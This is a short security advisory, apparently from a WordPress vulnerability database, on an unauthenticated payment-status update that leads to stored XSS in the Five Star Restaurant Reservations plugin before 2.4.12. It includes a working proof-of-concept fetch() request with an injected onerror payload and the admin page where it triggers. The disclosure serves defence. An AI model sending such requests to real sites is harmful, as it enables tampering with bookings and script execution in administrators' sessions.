## WordPress Plugin Vulnerabilities

# Five Star Restaurant Reservations < 2.4.12 - Unauthenticated Arbitrary Payment Status Update to Stored XSS

### Description

The plugin does not have authorisation when changing whether a payment was successful or failed, allowing unauthenticated users to change the payment status of arbitrary bookings. Furthermore, due to the lack of sanitisation and escaping, attackers could perform Cross-Site Scripting attacks against a logged in admin viewing the failed payments

### Proof of Concept

As an unauthenticated user (booking\_id needs to be valid):
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=rtb\_stripe\_pmt\_succeed&success=false&message=<img src onerror=alert(1)>&booking\_id=1",
"method": "POST",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
The XSS will be triggered at http://example.com/wp-admin/admin.php?page=rtb-bookings&date\_range=all&status=payment\_failed
